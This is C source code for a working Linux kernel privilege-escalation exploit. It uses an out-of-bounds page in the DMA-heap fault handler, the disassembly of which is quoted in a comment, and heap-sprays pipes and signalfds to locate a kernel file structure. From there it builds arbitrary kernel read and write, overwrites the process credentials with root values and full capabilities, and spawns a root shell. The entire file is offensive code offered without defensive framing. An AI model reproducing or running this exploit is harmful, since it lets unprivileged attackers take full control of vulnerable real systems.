#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <unistd.h>

#include "dma_buf_t.h"
#include <string.h>
#include <sys/signalfd.h>
#include <sys/fcntl.h>
#include <syscall.h>

#define PAGE_SIZE 0x1000

#define NUM_SPRAY_PAGES (128)
#define NUM_SPRAY_DMA_FD (40)
#define NUM_SPRAY_ITERATIONS (20)

#define NUM_SPRAY_ITERATIONS_2 (100)
#define NUM_SPRAY_PIPES (20)
#define NUM_SPRAY_SIGNAL_FDS (20)

#define N_PAGES (NUM_SPRAY_PAGES-1)

#define KERNEL_PAGE_ARRAY_SPRAY_SIZE (NUM_SPRAY_PAGES*sizeof(void*))
#define KERNEL_PAGE_ARRAY_SIZE (N_PAGES*sizeof(void*))

#define errx(ret_code, msg) do{perror(msg); exit(ret_code);} while(0);

static dma_buf_t *spray_dma_bufs[NUM_SPRAY_DMA_FD];

static int spray_pipe_fds[NUM_SPRAY_PIPES][2];
static int spray_signalfd_fds[NUM_SPRAY_SIGNAL_FDS];

#define min(a,b) ((a)<(b)?(a):(b))
#define max(a,b) ((a)>(b)?(a):(b))

//image_base ffffffff81000000 _text
//20ab018bffffffff
//ffffffff8a000000
//ffffffff8b01ab20
//         101ab20
//ffffffff8201ab20 -> pipefifo_fops
//ffffffff8201cf40 -> signalfd_fops

int spray_bufs()
{
    //printf("[+] spraying dma bufs\n");
    for(int i=0; i<NUM_SPRAY_DMA_FD; i++)
    {
        spray_dma_bufs[i] = dma_buf_create(NUM_SPRAY_PAGES*PAGE_SIZE);
        if(!spray_dma_bufs[i])
            errx(1, "[-] couldn't create spray dma buf");
    }
    return 0;
}

int spray_bufs_cleanup()
{
    //printf("[+] cleaning up dma bufs\n");
    for(int i=0; i<NUM_SPRAY_DMA_FD; i++)
    {
        if(dma_buf_close(spray_dma_bufs[i])<0)
            errx(1, "[-] couldn't close spray dma buf");
        spray_dma_bufs[i] = NULL;
    }
    return 0;
}

int spray_pipe(int idx)
{
    if(pipe(spray_pipe_fds[idx]))
        errx(1, "[-] couldn't create spray pipe");
    return 0;
}

int spray_pipes()
{
    for(int i=0; i<NUM_SPRAY_PIPES; i++)
    {
        spray_pipe(i);
    }
    return 0;
}

int spray_pipes_cleanup()
{
    for(int i=0; i<NUM_SPRAY_PIPES; i++)
    {
        close(spray_pipe_fds[i][0]);
        close(spray_pipe_fds[i][1]);
        spray_pipe_fds[i][0] = -1;
        spray_pipe_fds[i][1] = -1;
    }
    return 0;
}

int spray_signalfd(int idx)
{
    sigset_t sigset = {0};
    spray_signalfd_fds[idx] = signalfd(-1, &sigset, 0);
    return 0;
}

int spray_signalfds()
{
    for(int i=0; i<NUM_SPRAY_SIGNAL_FDS; i++)
    {
        spray_signalfd(i);
    }
    return 0;
}

int spray_signalfd_cleanup()
{
    for(int i=0; i<NUM_SPRAY_SIGNAL_FDS; i++)
    {
        close(spray_signalfd_fds[i]);
    }
    return 0;
}

int spray_both()
{
    for(int i=0; i<NUM_SPRAY_SIGNAL_FDS; i++)
    {
        spray_pipe(i);
        spray_signalfd(i);
    }
    return 0;
}

int spray_both_cleanup()
{
    spray_signalfd_cleanup();
    spray_pipes_cleanup();
}
/**
Disassembly of section .text:

ffffffff816d9480 <dma_heap_vm_fault>:
ffffffff816d9480:       e8 bb 3a 97 ff          call   ffffffff8104cf40 <__fentry__>
ffffffff816d9485:       48 8b 07                mov    (%rdi),%rax //rax=vmf->vma
ffffffff816d9488:       48 8b 57 10             mov    0x10(%rdi),%rdx //rdx=vmf->pgoff
ffffffff816d948c:       48 8b 88 a8 00 00 00    mov    0xa8(%rax),%rcx //rcx=vma->vm_private_data=buffer
ffffffff816d9493:       b8 02 00 00 00          mov    $0x2,%eax
ffffffff816d9498:       48 39 51 50             cmp    %rdx,0x50(%rcx) //vmf->pgoff > buffer->pagecount
ffffffff816d949c:       72 21                   jb     ffffffff816d94bf <dma_heap_vm_fault+0x3f>
ffffffff816d949e:       48 8b 41 58             mov    0x58(%rcx),%rax //rax=&buffer->pages
ffffffff816d94a2:       48 8b 04 d0             mov    (%rax,%rdx,8),%rax //rax=buffer->pages[vmf->pgoff]
ffffffff816d94a6:       48 89 47 40             mov    %rax,0x40(%rdi) //vmf->page = rax
ffffffff816d94aa:       48 8b 50 08             mov    0x8(%rax),%rdx //inlined get_page
ffffffff816d94ae:       48 8d 4a ff             lea    -0x1(%rdx),%rcx
ffffffff816d94b2:       83 e2 01                and    $0x1,%edx
ffffffff816d94b5:       48 0f 45 c1             cmovne %rcx,%rax
ffffffff816d94b9:       f0 ff 40 34             lock incl 0x34(%rax)
ffffffff816d94bd:       31 c0                   xor    %eax,%eax
ffffffff816d94bf:       c3                      ret
 */

void hexdump(char* addr, size_t len)
{
    const size_t line_size=32;
    const size_t group_by = 8;
    size_t off = 0;
    int64_t rem = len;
    printf("hexdump@%p:\n",addr);
    while(rem)
    {
        printf("+0x%04lx:", off);
        for(int l_cnt=0; l_cnt<line_size && rem; l_cnt++,off++,rem--)
        {
            if((l_cnt%group_by)==0)
                printf(" ");
            printf("%02hhx", addr[off]);
        }
        printf("\n");
    }
}

void fault_in_page(void* addr)
{
    volatile char dummy;
    dummy = *(char*)addr;
}

void remove_page(void* addr)
{
    madvise(addr,PAGE_SIZE, MADV_DONTNEED);
}

static inline int looks_like_kheap_ptr(void* ptr)
{
    const void* kheap_min = (void*)0xffff000000000000ULL;
    const void* kheap_max = (void*)0xfffff00000000000ULL;
    if(ptr < kheap_min)
        return 0;
    if(ptr < kheap_max)
        return 1;
    return 0;
}

static inline int looks_like_ktext_ptr(void* ptr)
{
    const void* ktext_min = (void*)0xffffffff80000000ULL;
    const void* ktext_max = (void*)0xffffffffc0000000ull;
    if(ptr < ktext_min)
        return 0;
    if(ptr < ktext_max)
        return 1;
    return 0;
}

static inline int looks_like_kernel_ptr(void* ptr)
{
    if(looks_like_kheap_ptr(ptr))
        return 1;
    if(looks_like_ktext_ptr(ptr))
        return 1;
    return 0;
}

static inline int matches_signalfd_fops(void* ptr)
{
    return ((uint64_t)ptr&0xfff) == 0xf40;
}

static inline int looks_like_filp_around(void** ptr, void** end)
{
    //don't need to worry about underflow because we always have valid previous pages
    //3 fields before are pointers
    if(!looks_like_kheap_ptr(*(ptr-1))) return 0;
    if(!looks_like_kheap_ptr(*(ptr-2))) return 0;
    if(!looks_like_kheap_ptr(*(ptr-3))) return 0;
    //2 fields before that aren't
    if(looks_like_kernel_ptr(*(ptr-4))) return 0;
    if(looks_like_kernel_ptr(*(ptr-5))) return 0;
    return 1;
}

static volatile void* signalfd_filp_addr = NULL;
static int signalfd_fd = -1;
static char signalfd_proc_path[256];
static int signalfd_proc_fd = -1;

int scan_page_for_signalfd_filp(char* page)
{
    void** page_ptrs = (void**) page;
    void** end = (void**) (page+PAGE_SIZE-0x100);//just to make sure the interesting fields can be accessed without worrying about faulting
    while(page_ptrs < end)
    {
        //found something that may be signalfd_fops
        if(looks_like_kernel_ptr((void*)*page_ptrs) && matches_signalfd_fops(*page_ptrs))
        {
            hexdump(((void*)page_ptrs)-5*8,0x100);
            if(looks_like_filp_around(page_ptrs, end))
            {
                signalfd_filp_addr = page_ptrs;
                printf("[+] Found signalfd filp @ %p\n", signalfd_filp_addr);
                return 1;
            }
        }
        page_ptrs++;
    }
    return 0;
}


static inline int* get_signalfd_flags()
{
    return (int*)(signalfd_filp_addr+24);
}

static inline uint64_t* get_signalfd_private_data()
{
    return (uint64_t*)(signalfd_filp_addr+0xa0);
}

static inline uint64_t* get_signalfd_creds_ptr()
{
    return (uint64_t*)(signalfd_filp_addr+0x68);
}

int identify_signalfd_fd()
{
    const int fd_flags_overwrite = 0xf00f;
    if(!signalfd_filp_addr)
        return 0;
    int* flag_ptr = get_signalfd_flags();
    *flag_ptr = fd_flags_overwrite;
    printf("[+] checking for changed flags on signalfd\n");
    for(int i=0; i<NUM_SPRAY_SIGNAL_FDS; i++)
    {
        int fd_flags = fcntl(spray_signalfd_fds[i], F_GETFL);
        if(fd_flags==fd_flags_overwrite)
        {
            signalfd_fd = spray_signalfd_fds[i];
            return 1;
        }
    }
    return 0;
}

size_t read_sigmask(int procfs_fd)
{
    char buf[512];
    lseek(procfs_fd, 0, SEEK_SET);
    //Read from procfs
    int read_bytes = 0;
    if((read_bytes = read(procfs_fd,buf,sizeof(buf)-1))<=0)
    {
        perror("[-] Failed to read from procfs_fd");
        exit(-1);
    }

    //Gather heap leak from procfs output
    buf[read_bytes] = 0;
    //printf("[+] Procfs: %d read\n%s\n",read_bytes, buf);
    if(read_bytes <= 54)
    {
        printf("[-] Couldn't read sigmask\n");
        printf("[-] Procfs: %d read\n%s\n",read_bytes, buf);
        return 0;
    }
    buf[read_bytes-1] = 0;
    char* hex_str = (buf+read_bytes-16-1);
    size_t hex_val = strtoull(hex_str, NULL, 16);
    return hex_val;
}

uint64_t arb_read_8(void* addr)
{
    uint64_t* ptr = get_signalfd_private_data();
    uint64_t old_val = *ptr;
    *ptr = (uint64_t)addr;

    uint64_t result = read_sigmask(signalfd_proc_fd);
    *ptr = old_val;
    return ~result;
}

int raw_signalfd(int fd, sigset_t* sigset, int flags)
{
    return syscall(__NR_signalfd, fd, sigset, flags);
}

void arb_write_8(void* addr, uint64_t val)
{
    uint64_t* ptr = get_signalfd_private_data();
    uint64_t old_val = *ptr;
    *ptr = (uint64_t) addr;
    uint64_t written_val = ~val;
    int ret = raw_signalfd(signalfd_fd, (sigset_t*)&written_val, 8);
    if(ret<0)
        perror("[-] raw_syscall");
    *ptr = old_val;
}

void prep_arb_read()
{
    int pid = getpid();
    snprintf(signalfd_proc_path, sizeof(signalfd_proc_path), "/proc/%d/fdinfo/%d", pid, signalfd_fd);
    printf("[+] Going to open %s\n", signalfd_proc_path);
    signalfd_proc_fd = open(signalfd_proc_path, O_RDONLY);
    if(signalfd_proc_fd<0)
        errx(1, "couldn't open proc fdinfo");
}

void dump_creds(void* creds_kaddr)
{
    uint64_t creds_buf[32];
    for(int i=0; i<32; i++)
        creds_buf[i] = arb_read_8(creds_kaddr+8*i);
    hexdump((void*)creds_buf, 32*8);
}

void zero_creds(void* creds_kaddr)
{
    for(int i=0; i<44; i++)
    {
        arb_write_8((void*)(creds_kaddr+4+i), 0);
    }
    //restore capability flags
    arb_write_8((creds_kaddr+4*12),0x01ffffffffffULL);
}

int main(int argc, char* argv[])
{
    printf("[+] Expected spray kmalloc_size:\t%lu(0x%lx)\n", KERNEL_PAGE_ARRAY_SPRAY_SIZE, KERNEL_PAGE_ARRAY_SPRAY_SIZE);
    printf("[+] Expected exploit kmalloc_size:\t%lu(0x%lx)\n", KERNEL_PAGE_ARRAY_SIZE, KERNEL_PAGE_ARRAY_SIZE);
    for(int i=0; i<NUM_SPRAY_ITERATIONS; i++)
    {
        spray_bufs();
        spray_bufs_cleanup();
    }

    spray_both();

    printf("[+] creating exploit dma buf\n");
    dma_buf_t *dma_buf = dma_buf_create(N_PAGES*PAGE_SIZE);
    if(!dma_buf)
        errx(1, "[-] couldn't create exploit dma buf");

    printf("[+] mapping dma buf\n");
    void* addr = mmap(NULL, dma_buf->size,
        PROT_READ|PROT_WRITE, MAP_SHARED, dma_buf->buf_fd, 0);
    if (addr == MAP_FAILED)
        errx(1, "[-] couldn't map memory");

    printf("[+] expanding dma buf by one page\n");
    void* remapped_addr = mremap(addr, dma_buf->size, dma_buf->size+PAGE_SIZE, MREMAP_MAYMOVE);
    if(remapped_addr==MAP_FAILED)
        errx(1, "[-] couldn't mremap memory");

    printf("[+] accessing pages including OOB page\n");
    volatile char dummy = 0;
    for(int offset=0; offset<dma_buf->size; offset+=PAGE_SIZE)
    {
        //printf("[+] offset=%lx\n", (ulong)offset);
        *((char*)remapped_addr+offset) = 0x41;
    }
    char* stolen_page = remapped_addr+dma_buf->size;
    fault_in_page(stolen_page);
    printf("[+] Didn't crash, stole a page @%p\n", stolen_page);

    spray_both_cleanup();

    for(int i=0; i<NUM_SPRAY_ITERATIONS_2; i++)
    {
        remove_page(stolen_page);
        spray_both();
        if(scan_page_for_signalfd_filp(stolen_page))
            break;
        // for(int j=0;j<PAGE_SIZE; j++)
        // {
        //     if(stolen_page[j] && stolen_page[j]!=0x41)
        //     {
        //         hexdump(stolen_page, PAGE_SIZE);
        //         //memset(stolen_page,0,PAGE_SIZE);
        //         exit(0);
        //     }
        // }
        spray_both_cleanup();
    }

    if(!signalfd_filp_addr)
    {
        printf("[-] Couldn't find signalfd_filp\n");
        exit(1);
    }
    
    spray_pipes_cleanup();

    if(!identify_signalfd_fd())
    {
        printf("[-] Couldn't identify signalfd_filp\n");
        exit(1);
    }
    printf("[+] identified correct fd\n");

    prep_arb_read();

    // uint64_t* dummy_list_head = (uint64_t*)(signalfd_filp_addr+0xa8);
    // uint64_t dummy_list_head_val = *dummy_list_head;
    // printf("[+] dummy list_head: %p %p\n",(void*)dummy_list_head_val, (void*)arb_read_8((void*)dummy_list_head_val));
    // arb_write_8((void*)dummy_list_head_val, 0xf00f);
    // printf("[+] dummy list_head: %p %p\n",(void*)dummy_list_head_val, (void*)arb_read_8((void*)dummy_list_head_val));
    // arb_write_8((void*)dummy_list_head_val, dummy_list_head_val);
    // printf("[+] dummy list_head: %p %p\n",(void*)dummy_list_head_val, (void*)arb_read_8((void*)dummy_list_head_val));

    uint64_t *creds_ptr = get_signalfd_creds_ptr();
    uint64_t creds_addr = *creds_ptr;
    printf("[+] creds@%p\n", (void*)creds_addr);

    dump_creds((void*)creds_addr);

    zero_creds((void*)creds_addr);

    dump_creds((void*)creds_addr);

    system("sh");
}